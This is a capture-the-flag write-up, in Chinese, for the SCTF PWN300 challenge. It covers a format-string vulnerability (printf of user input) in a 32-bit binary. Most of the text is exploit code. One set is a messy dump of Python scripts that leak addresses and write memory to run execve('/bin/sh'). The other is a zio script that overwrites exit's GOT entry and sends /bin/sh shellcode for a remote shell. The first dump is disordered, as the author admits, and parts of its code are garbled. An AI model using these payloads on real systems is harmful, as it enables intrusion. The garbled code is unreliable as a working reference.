---
title: SCTF PWN300 WriteUp
author: Ripples
layout: post
views:
  - 373
categories:
  - CTF
tags:
  - buffer overflow
  - CTF
  - ROP
  - SCTF
  - WriteUp
---
<p style="text-indent: 2em;">
  这题同样也不难，尤其是在做了PWN200之后，很容易便能想清楚这题可以怎么做，唯一的区别就是PWN200是栈溢出，这题是格式化字符串漏洞。
</p>

<p style="text-indent: 2em;">
  IDA反编译的程序如下（我改了几个函数名方便看）：
</p>

<!--more-->

<pre class="brush:cpp;toolbar:false">int&nbsp;__cdecl&nbsp;show_hint()
{
&nbsp;&nbsp;puts("----------------------");
&nbsp;&nbsp;puts("1:Play&nbsp;a&nbsp;game");
&nbsp;&nbsp;puts("2:Leave&nbsp;a&nbsp;message");
&nbsp;&nbsp;puts("3:Print&nbsp;your&nbsp;message");
&nbsp;&nbsp;puts("4:Exit");
&nbsp;&nbsp;return&nbsp;puts("----------------------");
}

int&nbsp;__cdecl&nbsp;leave_message()
{
&nbsp;&nbsp;puts("input&nbsp;your&nbsp;message");
&nbsp;&nbsp;memset(src,&nbsp;0,&nbsp;0x400u);
&nbsp;&nbsp;return&nbsp;read_str(src,&nbsp;1024);
}

int&nbsp;__cdecl&nbsp;show_message()
{
&nbsp;&nbsp;int&nbsp;result;&nbsp;//&nbsp;eax@1
&nbsp;&nbsp;char&nbsp;dest;&nbsp;//&nbsp;[sp+1Ch]&nbsp;[bp-40Ch]@1
&nbsp;&nbsp;int&nbsp;v2;&nbsp;//&nbsp;[sp+41Ch]&nbsp;[bp-Ch]@1

&nbsp;&nbsp;v2&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20);
&nbsp;&nbsp;strcpy(&dest,&nbsp;src);
&nbsp;&nbsp;printf("Your&nbsp;message&nbsp;is:");
&nbsp;&nbsp;printf(src);
&nbsp;&nbsp;result&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;^&nbsp;v2;
&nbsp;&nbsp;if&nbsp;(&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;!=&nbsp;v2&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;__stack_chk_fail();
&nbsp;&nbsp;return&nbsp;result;
}

void&nbsp;__cdecl&nbsp;guess_number()
{
&nbsp;&nbsp;unsigned&nbsp;int&nbsp;v0;&nbsp;//&nbsp;eax@1
&nbsp;&nbsp;int&nbsp;v1;&nbsp;//&nbsp;[sp+18h]&nbsp;[bp-10h]@2
&nbsp;&nbsp;int&nbsp;v2;&nbsp;//&nbsp;[sp+1Ch]&nbsp;[bp-Ch]@1

&nbsp;&nbsp;v0&nbsp;=&nbsp;time(0);
&nbsp;&nbsp;srand(v0);
&nbsp;&nbsp;v2&nbsp;=&nbsp;rand()&nbsp;%&nbsp;10;
&nbsp;&nbsp;puts("Test&nbsp;your&nbsp;RP....");
&nbsp;&nbsp;do
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;do
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Guess&nbsp;a&nbsp;number(0-10):");
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__isoc99_read_str("%d",&nbsp;&v1);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(&nbsp;v1&nbsp;&lt;&nbsp;0&nbsp;);
&nbsp;&nbsp;}
&nbsp;&nbsp;while&nbsp;(&nbsp;v1&nbsp;&gt;&nbsp;10&nbsp;);
&nbsp;&nbsp;if&nbsp;(&nbsp;v2&nbsp;==&nbsp;v1&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;puts("You&nbsp;win");
&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;puts("You&nbsp;lost");
&nbsp;&nbsp;exit(0);
}

void&nbsp;__cdecl&nbsp;main()
{
&nbsp;&nbsp;signed&nbsp;int&nbsp;v0;&nbsp;//&nbsp;[sp+1Fh]&nbsp;[bp-1h]@2

&nbsp;&nbsp;setvbuf(stdout,&nbsp;0,&nbsp;2,&nbsp;0);
&nbsp;&nbsp;puts("Welcome&nbsp;to&nbsp;SCTF!&nbsp;Good&nbsp;luck&nbsp;&&nbsp;Have&nbsp;fun~");
&nbsp;&nbsp;while&nbsp;(&nbsp;1&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(&nbsp;1&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show_hint();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts("input&nbsp;your&nbsp;choice:");
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read(&v0,&nbsp;2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;(char)v0&nbsp;!=&nbsp;50&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;leave_message();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts(&byte_8048AEE);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;(char)v0&nbsp;&gt;&nbsp;50&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;(char)v0&nbsp;==&nbsp;51&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show_message();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts(&byte_8048AEE);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;(char)v0&nbsp;==&nbsp;52&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;(char)v0&nbsp;==&nbsp;49&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;guess_number();
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
}</pre>

<p style="text-indent: 2em;">
  很明显我们可以发现，guess_number是没有用的，leave_message和show_message才是我们需要注意的重点，show_message中是直接调用printf(src)进行的输出，而src是我们输入的字符串，很显然，这里是再明显不过了的格式化字符串溢出漏洞了，我们需要想的只是溢出之后怎么拿到shell。
</p>

<p style="text-indent: 2em;">
  毫无疑问，我们这里完全可以仿照PWN200的方法，先输出libc中某个函数的真实地址，然后算出execve的地址，而调用execve所需的字符串/bin/sh我们可以直接通过栈传递进去，不用写到GOT表那里了，因为这一次通过格式化字符串漏洞我们是知道栈地址的。
</p>

<p style="text-indent: 2em;">
  然后这题比较蛋疼的是，他输出既有用puts，也有用printf，然后我当时为了偷懒，就想用puts来输出地址，然后不知道为什么总是错，后来换用printf来输出就好了，就为了这个问题，当时硬生生熬到凌晨两三点人都快不行了才搞出来。
</p>

<p style="text-indent: 2em;">
  然后，后来还了解到，栈中是有libc的加载地址的，于是乎，可以直接就在栈中找就好了，方便点。
</p>

<p style="text-indent: 2em;">
  下面还是贴下我比赛时的程序，因为当时实在不知道错哪了，还在本地把那个程序跑起来了进行本地实验，然后代码现在确实有点分不太清楚哪些是最终通过的代码部分了，因为当时一做出来就去睡了，再没看了，所以先全部贴出来吧，要是将来啥时候有闲情，再来整理下吧：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python
#encoding:utf-8

s.send(&#39;2n&#39;)
s.recv(4096)
s.send(&#39;0x%266$08x&nbsp;0x%277$08xn&#39;)
s.recv(4096)
s.send(&#39;3n&#39;)
s.recv(4096)

import&nbsp;socket
import&nbsp;binascii

s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
#&nbsp;s.connect((&#39;218.2.197.248&#39;,&nbsp;10002))
s.connect((&#39;10.211.55.10&#39;,&nbsp;8888))
s.send(&#39;2n&#39;)
s.recv(4096)
s.send(&#39;0x%266$08x&nbsp;0x%265$08x&nbsp;0x%267$08xn&#39;)
s.recv(4096)
s.send(&#39;3n&#39;)
ret&nbsp;=&nbsp;s.recv(4096)
while&nbsp;ret.find(&#39;0x&#39;)&nbsp;==&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;+=&nbsp;s.recv(4096)

pos&nbsp;=&nbsp;ret.find(&#39;0x&#39;)
ebp&nbsp;=&nbsp;int(ret[pos&nbsp;+&nbsp;2:pos&nbsp;+&nbsp;10],&nbsp;16)
#&nbsp;binascii.hexlify(binascii.unhexlify(hex(ebp&nbsp;-&nbsp;0x30&nbsp;-&nbsp;0x40c&nbsp;+&nbsp;64&nbsp;+&nbsp;240)[2:])[::-1])

first&nbsp;=&nbsp;calc(ebp&nbsp;-&nbsp;0x30&nbsp;+&nbsp;4)
#&nbsp;second&nbsp;=&nbsp;fill(0x30,&nbsp;&#39;e0840408&#39;&#39;9f880408&#39;&#39;18910408&#39;)
second&nbsp;=&nbsp;fill(0x80,&nbsp;&#39;e0840408&#39;&#39;70850408&#39;&#39;04910408&#39;)
if&nbsp;first.find(&#39;x00&#39;)&nbsp;!=&nbsp;-1&nbsp;or&nbsp;second.find(&#39;x00&#39;)&nbsp;!=&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;RuntimeError()

s.send(&#39;2n&#39;)
s.recv(4096)
s.send(first&nbsp;+&nbsp;second&nbsp;+&nbsp;&#39;a&#39;&nbsp;*&nbsp;(240&nbsp;-&nbsp;len(second))&nbsp;+&nbsp;&#39;n&#39;)
s.recv(4096)
s.send(&#39;3n&#39;)
print&nbsp;hex(ebp)
ret&nbsp;=&nbsp;s.recv(4096)

while&nbsp;ret.find(&#39;a&#39;&nbsp;*&nbsp;5)&nbsp;==&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;+=&nbsp;s.recv(4096)

pos&nbsp;=&nbsp;ret.find(&#39;a&#39;&nbsp;*&nbsp;5)&nbsp;+&nbsp;5

#&nbsp;puts_addr&nbsp;=&nbsp;int(binascii.hexlify(ret[pos:pos&nbsp;+&nbsp;4][::-1]),&nbsp;16)
puts_addr&nbsp;=&nbsp;int(binascii.hexlify(ret[:4][::-1]),&nbsp;16)
puts_pos&nbsp;=&nbsp;binascii.hexlify(binascii.unhexlify(hex(puts_addr)[2:])[::-1])
execve_addr&nbsp;=&nbsp;0x000B8240&nbsp;-&nbsp;0xde3a0&nbsp;+&nbsp;puts_addr
execve_pos&nbsp;=&nbsp;binascii.hexlify(binascii.unhexlify(hex(execve_addr)[2:])[::-1])
execve_pos&nbsp;=&nbsp;&#39;203becf7&#39;


import&nbsp;socket
import&nbsp;binascii

s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
s.connect((&#39;218.2.197.248&#39;,&nbsp;10002))
#&nbsp;s.connect((&#39;10.211.55.10&#39;,&nbsp;8888))
s.send(&#39;2n&#39;)
s.recv(4096)
s.send(&#39;0x%266$08x&nbsp;0x%265$08x&nbsp;0x%267$08xn&#39;)
s.recv(4096)
s.send(&#39;3n&#39;)
ret&nbsp;=&nbsp;s.recv(4096)
while&nbsp;ret.find(&#39;0x&#39;)&nbsp;==&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;+=&nbsp;s.recv(4096)

pos&nbsp;=&nbsp;ret.find(&#39;0x&#39;)
ebp&nbsp;=&nbsp;int(ret[pos&nbsp;+&nbsp;2:pos&nbsp;+&nbsp;10],&nbsp;16)

#&nbsp;bin_sh_pos&nbsp;=&nbsp;binascii.hexlify(binascii.unhexlify(hex(ebp&nbsp;-&nbsp;0x30&nbsp;-&nbsp;0x40c&nbsp;+&nbsp;0x60&nbsp;+&nbsp;300)[2:])[::-1])
bin_sh_pos&nbsp;=&nbsp;binascii.hexlify(binascii.unhexlify(hex(ebp&nbsp;-&nbsp;0x30&nbsp;+&nbsp;0x14&nbsp;+&nbsp;8)[2:])[::-1])
first&nbsp;=&nbsp;calc(ebp&nbsp;-&nbsp;0x30&nbsp;+&nbsp;4)
#&nbsp;second&nbsp;=&nbsp;fill(0x60,&nbsp;&#39;e0840408&#39;&#39;9f880408&#39;&nbsp;+&nbsp;bin_sh_pos&nbsp;+&nbsp;&#39;2f62696e2f736800&#39;)
#&nbsp;second&nbsp;=&nbsp;fill(0x60,&nbsp;execve_pos&nbsp;+&#39;9f880408&#39;&nbsp;+&nbsp;bin_sh_pos)
second&nbsp;=&nbsp;fill(0x80,&nbsp;&#39;a0840408&#39;&nbsp;+&nbsp;&#39;70850408&#39;&nbsp;+&nbsp;bin_sh_pos&nbsp;+&nbsp;&#39;04910408&#39;&nbsp;+&nbsp;&#39;00&#39;&nbsp;*&nbsp;8&nbsp;+&nbsp;&#39;3d3d2538733d3d2d&#39;)

s.send(&#39;2n&#39;)
s.recv(4096)
s.send(first&nbsp;+&nbsp;second&nbsp;+&nbsp;&nbsp;&#39;a&#39;&nbsp;*&nbsp;(400&nbsp;-&nbsp;len(second))&nbsp;+&nbsp;&#39;n&#39;)
s.recv(4096)
s.send(&#39;3n&#39;)
ret&nbsp;=&nbsp;s.recv(4096)

s.send(&#39;2n&#39;)
s.recv(4096)
s.send(&#39;0x%266$08x&nbsp;0x%265$08x&nbsp;0x%267$08xn&#39;)
s.recv(4096)
s.send(&#39;3n&#39;)
ret&nbsp;=&nbsp;s.recv(4096)
while&nbsp;ret.find(&#39;0x&#39;)&nbsp;==&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;+=&nbsp;s.recv(4096)

pos&nbsp;=&nbsp;ret.find(&#39;0x&#39;)
ebp&nbsp;=&nbsp;int(ret[pos&nbsp;+&nbsp;2:pos&nbsp;+&nbsp;10],&nbsp;16)

#&nbsp;bin_sh_pos&nbsp;=&nbsp;binascii.hexlify(binascii.unhexlify(hex(ebp&nbsp;-&nbsp;0x30&nbsp;-&nbsp;0x40c&nbsp;+&nbsp;0x60&nbsp;+&nbsp;300)[2:])[::-1])
bin_sh_pos&nbsp;=&nbsp;binascii.hexlify(binascii.unhexlify(hex(ebp&nbsp;-&nbsp;0x30&nbsp;+&nbsp;0x14&nbsp;+&nbsp;8)[2:])[::-1])
first&nbsp;=&nbsp;calc(ebp&nbsp;-&nbsp;0x30&nbsp;+&nbsp;4)
#&nbsp;second&nbsp;=&nbsp;fill(0x60,&nbsp;&#39;e0840408&#39;&#39;9f880408&#39;&nbsp;+&nbsp;bin_sh_pos&nbsp;+&nbsp;&#39;2f62696e2f736800&#39;)
#&nbsp;second&nbsp;=&nbsp;fill(0x60,&nbsp;execve_pos&nbsp;+&#39;9f880408&#39;&nbsp;+&nbsp;bin_sh_pos)
second&nbsp;=&nbsp;fill(0x80,&nbsp;&#39;e0840408&#39;&nbsp;+&nbsp;execve_pos&nbsp;+&nbsp;bin_sh_pos&nbsp;+&nbsp;bin_sh_pos&nbsp;+&nbsp;&#39;00&#39;&nbsp;*&nbsp;8&nbsp;+&nbsp;&#39;2f62696e2f736800&#39;)

s.send(&#39;2n&#39;)
s.recv(4096)
s.send(first&nbsp;+&nbsp;second&nbsp;+&nbsp;&nbsp;&#39;a&#39;&nbsp;*&nbsp;(400&nbsp;-&nbsp;len(second))&nbsp;+&nbsp;&#39;n&#39;)
s.recv(4096)
s.send(&#39;3n&#39;)
ret&nbsp;=&nbsp;s.recv(4096)

def&nbsp;calc(addr):
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;&#39;&#39;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;pos&nbsp;in&nbsp;xrange(addr,&nbsp;addr&nbsp;+&nbsp;32):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;chr(int(hex(pos&nbsp;&&nbsp;0xff)[2:4],&nbsp;16))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;chr(int(hex(pos&nbsp;&&nbsp;0xff00)[2:4],&nbsp;16))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;chr(int(hex(pos&nbsp;&&nbsp;0xff0000)[2:4],&nbsp;16))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;chr(int(hex(pos&nbsp;&&nbsp;0xff000000)[2:4],&nbsp;16))
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;payload

def&nbsp;fill(last,&nbsp;aim):
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;&#39;&#39;
&nbsp;&nbsp;&nbsp;&nbsp;num&nbsp;=&nbsp;7
&nbsp;&nbsp;&nbsp;&nbsp;zero&nbsp;=&nbsp;265
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;xrange(0,&nbsp;len(aim),&nbsp;2):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now&nbsp;=&nbsp;int(aim[i:i&nbsp;+&nbsp;2],&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;now&nbsp;!=&nbsp;last:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;now&nbsp;&lt;&nbsp;last:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now&nbsp;+=&nbsp;0x100
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;&#39;%&#39;&nbsp;+&nbsp;str(zero)&nbsp;+&nbsp;&#39;$&#39;&nbsp;+&nbsp;str(now&nbsp;-&nbsp;last)&nbsp;+&nbsp;&#39;x&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;last&nbsp;=&nbsp;now&nbsp;&&nbsp;0xff
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;&#39;%&#39;&nbsp;+&nbsp;str(num)&nbsp;+&nbsp;&#39;$hn&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num&nbsp;+=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;payload</pre>

<p style="text-indent: 2em;">
  最后还是想说，这题真的是好蛋疼，通过格式化字符串溢出漏洞要改这么多个值，想想就觉得残暴……
</p>

<p style="line-height: 16px; text-indent: 2em;">
  <img src _src=""/><a href="http://geekjayvic-wordpress.stor.sinaapp.com/uploads/2015/01/pwn300.zip">pwn300.zip</a>
</p>

* * *

<p style="line-height: 16px; text-indent: 2em;">
  重新整理了下这题，然后被人提醒bss段可写可执行，然后我就醉了，合着这题libc根本就用不到……
</p>

<p style="line-height: 16px; text-indent: 2em;">
  这里最后需要随便选个函数作为shellcode的触发，我选的exit，新代码如下：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python
#encoding:utf-8

import&nbsp;zio
from&nbsp;time&nbsp;import&nbsp;sleep


def&nbsp;NOPS(n):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&#39;x90&#39;&nbsp;*&nbsp;n

def&nbsp;LEFT_PAD(s,&nbsp;n):
&nbsp;&nbsp;&nbsp;&nbsp;assert&nbsp;len(s)&nbsp;&lt;=&nbsp;n
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NOPS(n&nbsp;-&nbsp;len(s))&nbsp;+&nbsp;s

def&nbsp;RIGHT_PAD(s,&nbsp;n):
&nbsp;&nbsp;&nbsp;&nbsp;assert&nbsp;len(s)&nbsp;&lt;=&nbsp;n
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;s&nbsp;+&nbsp;NOPS(n&nbsp;-&nbsp;len(s))

def&nbsp;PREPARE_FORMAT(payload,&nbsp;addr,&nbsp;count=4):
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;count&nbsp;==&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;payload

&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;zio.l32(addr)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;PREPARE_FORMAT(payload,&nbsp;addr&nbsp;+&nbsp;1,&nbsp;count&nbsp;-&nbsp;1)

def&nbsp;FILL_FORMAT(payload,&nbsp;last,&nbsp;addr_pos,&nbsp;value,&nbsp;count=4):
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;count&nbsp;==&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;payload,&nbsp;last

&nbsp;&nbsp;&nbsp;&nbsp;byte_value&nbsp;=&nbsp;value&nbsp;&&nbsp;0xff
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;byte_value&nbsp;!=&nbsp;last:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;byte_value&nbsp;&lt;&nbsp;last:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte_value&nbsp;+=&nbsp;0x100
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;&#39;%%1$%dc&#39;&nbsp;%&nbsp;(byte_value&nbsp;-&nbsp;last)
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;&#39;%%%d$hhn&#39;&nbsp;%&nbsp;addr_pos

&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;FILL_FORMAT(payload,&nbsp;byte_value&nbsp;&&nbsp;0xff,&nbsp;addr_pos&nbsp;+&nbsp;1,&nbsp;value&nbsp;&gt;&gt;&nbsp;8,&nbsp;count&nbsp;-&nbsp;1)

DELAY&nbsp;=&nbsp;0.1
JMP06&nbsp;=&nbsp;&#39;xebx06&#39;
SHELLCODE&nbsp;=&nbsp;"jx0bXx991xc9Rh//shh/binx89xe3xcdx80"

def&nbsp;RAW_WITH_DELAY(s):
&nbsp;&nbsp;&nbsp;&nbsp;sleep(DELAY)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;str(s)

def&nbsp;NONE_WITH_DELAY(s):
&nbsp;&nbsp;&nbsp;&nbsp;sleep(DELAY)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&#39;&#39;


TARGET&nbsp;=&nbsp;(&#39;218.2.197.235&#39;,&nbsp;10102)

SHELLCODE_ADDR&nbsp;=&nbsp;0x08049180
EXIT_GOT&nbsp;=&nbsp;0x8049120

#&nbsp;local
#&nbsp;TARGET&nbsp;=&nbsp;&#39;./pwn300&#39;


io&nbsp;=&nbsp;zio.zio(TARGET,&nbsp;print_write=NONE_WITH_DELAY,&nbsp;print_read=False)

payload&nbsp;=&nbsp;&#39;&#39;
payload&nbsp;=&nbsp;PREPARE_FORMAT(payload,&nbsp;EXIT_GOT)
last&nbsp;=&nbsp;len(payload)
payload,&nbsp;last&nbsp;=&nbsp;FILL_FORMAT(payload,&nbsp;last,&nbsp;7,&nbsp;SHELLCODE_ADDR)

#&nbsp;change&nbsp;exit&nbsp;got&nbsp;to&nbsp;shellcode&nbsp;addr
io.writeline(&#39;2&#39;)
io.writeline(payload)
io.writeline(&#39;3&#39;)

#&nbsp;call&nbsp;exit&nbsp;to&nbsp;trigger&nbsp;shellcode
io.writeline(&#39;2&#39;)
io.writeline(SHELLCODE)
io.writeline(&#39;4&#39;)

io.interact()</pre>
